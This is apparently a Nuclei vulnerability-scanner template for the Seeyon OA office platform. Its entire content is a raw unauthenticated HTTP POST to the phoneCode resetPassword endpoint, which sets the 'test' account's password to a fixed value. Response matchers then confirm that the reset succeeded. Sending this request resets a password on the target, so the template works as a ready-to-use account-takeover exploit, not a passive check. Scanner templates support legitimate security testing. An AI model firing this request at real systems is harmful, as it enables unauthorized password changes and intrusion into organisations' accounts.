id: seeyon-oa-phoneCode-resetPassword

info:
  name: seeyon-oa-phoneCode-resetPassword
  author: seeyon
  severity: high
  tags: seeyon

http:
  - raw:
      - |
        POST /seeyon/rest/phoneLogin/phoneCode/resetPassword HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:121.0) Gecko/20100101 Firefox/121.0
        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
        Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
        Accept-Encoding: gzip, deflate
        Connection: close
        Cookie: JSESSIONID=481F3949B045D38D5B7507C6CEA92FDB; loginPageURL=
        Upgrade-Insecure-Requests: 1
        Content-Type: application/json
        Content-Length: 45

        {"loginName":"test","password":"Sectest@123456"}

    matchers:
      - type: dsl
        dsl:
          - 'status_code == 200'
          - 'contains(body, "data\":true")'
          - 'contains(body, "message\":\"success")'
          - 'contains(body, "code\":0")'
        condition: and
